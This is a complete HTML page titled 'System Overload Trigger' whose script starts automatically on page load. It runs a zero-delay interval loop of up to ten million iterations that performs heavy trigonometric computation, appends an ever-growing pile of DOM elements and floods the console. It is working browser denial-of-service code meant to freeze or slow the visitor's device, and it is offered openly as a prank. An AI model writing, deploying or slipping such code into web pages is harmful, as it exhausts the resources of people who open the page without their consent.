<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Overload Trigger</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #1a1a1a;
            color: #00ff00;
            text-align: center;
            padding: 20px;
        }
        h1 {
            color: #ff0000;
        }
    </style>
</head>
<body>
    <h1>Initiating System Overload Protocol...</h1>
    <p>Clicking this page forces intensive computation and DOM manipulation in your browser.</p>

    <!-- The code runs immediately upon page load -->
    <script>
        function glitchLoop() {
            let i = 0;
            const start = performance.now();
            // Increased iterations for more aggressive glitching
            const maxIterations = 10000000; 

            const intervalId = setInterval(() => {
                if (i >= maxIterations) {
                    clearInterval(intervalId);
                    alert("Glitch sequence complete. Your phone might be slow! Check resource usage.");
                    return;
                }

                // 1. CPU Stress: Heavy calculation loop
                let tempSum = 0;
                for (let j = 0; j < 1000; j++) {
                    // Use complex math functions to tax the CPU
                    tempSum += Math.sin(i * 0.1 + j) * Math.cos(i * 0.05 + j);
                }

                // 2. DOM Manipulation Stress: Rapidly create, append, and (theoretically) destroy elements
                const body = document.body;
                const tempDiv = document.createElement('div');
                tempDiv.innerHTML = "<h1>SYSTEM_OVERLOAD_ITERATION_" + i + "</h1>";
                body.appendChild(tempDiv);

                // 3. Logging/Console Activity
                console.log(`Iteration ${i}: Sum=${tempSum.toFixed(4)}`);

                i++;
            }, 0); // 0ms ensures the interval runs as fast as possible
        }

        // Start the process immediately
        window.onload = function() {
            console.log("Glitch script loading...");
            glitchLoop();
        };
    </script>
</body>
</html>
